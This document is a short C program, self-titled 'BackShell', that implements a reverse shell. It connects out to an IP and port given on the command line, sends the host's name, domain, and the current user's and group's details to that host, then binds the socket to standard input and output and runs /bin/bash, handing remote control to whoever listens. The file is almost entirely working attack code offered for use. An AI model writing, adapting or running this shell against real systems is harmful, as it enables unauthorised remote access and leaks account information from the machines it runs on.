/*  gcc -o shell shell.c
*/

#include<stdio.h>
#include<string.h>
#include<stdlib.h>

#include<arpa/inet.h>
#include<netinet/in.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<sys/wait.h>

#include<unistd.h>
#include<errno.h>
#include<grp.h>
#include<pwd.h>

#define SHELL "/bin/bash"
#define LEN 100
#define USR_LEN 200

void error(const char *error)
{
  if(errno != 0)
    perror(error);
  else
    printf("Error in %s\n",error);
  _exit(1);
}

/* sending information to connected host  */
void send_information_to_user(int sockfd)
{
  struct passwd *pw;
  struct group *gr;
  uid_t uid;
  int st;
  char host[LEN];
  char domain[LEN];
  char user_information[USR_LEN];
  char grp_information[USR_LEN];
  char me[] = "\t\t \t BackShell\n\n\t\t By ray\n";
  
  if((st = gethostname(host , LEN)) == -1)
    error("[!]Getting Host_Name");
  if((st = getdomainname(domain , LEN)) == -1)
    error("[!]Getting Domain Name");
  
  strcat(host , "\n");
  strcat(domain , "\n");

  uid = getuid();
  
  if((pw = getpwuid(uid)) == NULL)
    error("[!]Grabbing User Information");
  if((gr = getgrgid(pw->pw_gid)) == NULL)
    error("[!]Grabbing Group Information");
  sprintf(user_information , "\t\tUser (%s) uid(%d) shell(%s) home(%s)\n",
                pw->pw_name , pw->pw_uid , pw->pw_shell , pw->pw_dir);
  sprintf(grp_information ,  "\t\tGroup (%s) ,gid (%d)\n",gr->gr_name , gr->gr_gid);
  
  if((st = send(sockfd , me , strlen(me) , 0)) < 0)
    error("[!]Sending Information");
  sleep(1);
  if((st = send(sockfd ,host , strlen(host) , 0 )) < 0)
    error("[!]Sending Information");
  sleep(1);
  if((st = send(sockfd , domain , strlen(domain) , 0)) < 0)
    error("[!]Sending Information");
  sleep(1);
  if((st = send(sockfd , user_information , strlen(user_information) , 0)) < 0)
    error("[!]Sending Information");
  sleep(1);
  if((st = send(sockfd , grp_information , strlen(grp_information) , 0)) < 0)
    error("[!]Sending Information");
}  
int main(int argc , char *argv[])
{
  int z , st;
  int sockfd;
  int sock_len;
  pid_t bind_sh;


  struct sockaddr_in att;

  if(argc < 3)
  {
    printf("usage %s ip_number port_number\n",argv[0]);
    _exit(0);
  }

  att.sin_family = AF_INET ;
  att.sin_port = htons(atoi(argv[2]));
  z = inet_aton(argv[1] , &att.sin_addr);
  sock_len = sizeof(att);
  
  if(z == 0)
    error("[!]Host_IP Invaild\n");
  
  sockfd = socket(PF_INET , SOCK_STREAM , 0);
  if(sockfd < 0)
    error("[!]Creating Socket Faild");


  bind_sh = fork();
  
  if(bind_sh == -1)
  {
    error("Cannot Open New Process");
  }else if (bind_sh == 0)
  {
    z = connect(sockfd , (struct sockaddr*)&att , sock_len);
    if(z == -1)
      error("[!]Connection error");
    
    send_information_to_user(sockfd);
    
    
    if((dup2(sockfd , 0) == -1) ||
          (dup2(sockfd , 1) == -1) ||
          (dup2(sockfd , 3) == -1));

    execl(SHELL , SHELL , NULL);
  }else
  {
    wait(&st); /* kinda useless but safe */
  }

  printf("Done\n");
  return 0;
}
